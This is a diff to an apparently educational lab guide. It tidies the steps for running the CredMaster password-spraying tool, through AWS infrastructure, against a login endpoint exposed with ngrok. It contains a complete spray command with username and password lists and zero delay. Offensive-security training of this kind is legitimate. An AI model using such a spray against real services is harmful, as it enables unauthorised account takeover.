@@ -130,29 +130,37 @@ Grab the link in the **Forwarding** section. We will need it later.
 
 ## Step 4: Run The Spray
 
-Finally open a **4th Terminal**
+Finally, open a **4th Terminal**.
 
-Run the spray with your AWS Keys:
+Start by navigating to the correct directory once more:
 
 ```bash
 cd ~/BnB/credMaster/CredMaster
 ```
 
+Now set the source:
+
 ```bash
 source venv/bin/activate
 ```
+
+Run the spray with your AWS Keys and Ngrok Domain:
+
+>[!NOTE]
+>Make sure to fill in your own information before running the command below!<br>
 
 ```bash
 python3 credmaster.py \
   --plugin httppost \
   -u ~/Desktop/names.txt \
   -p ~/Desktop/top-passwords-shortlist.txt \
-  --access_key YOUR_AWS_KEY \
-  --secret_access_key YOUR_AWS_SECRET \
-  --pluginargs url YOUR_NGROK_DOMAIN/auth/login content-type json \
+  --access_key [YOUR_AWS_KEY] \
+  --secret_access_key [YOUR_AWS_SECRET] \
+  --pluginargs url [YOUR_NGROK_DOMAIN]/auth/login content-type json \
   --delay 0 \
   --jitter 0
 ```
+
 
 **What these flags do:**
 
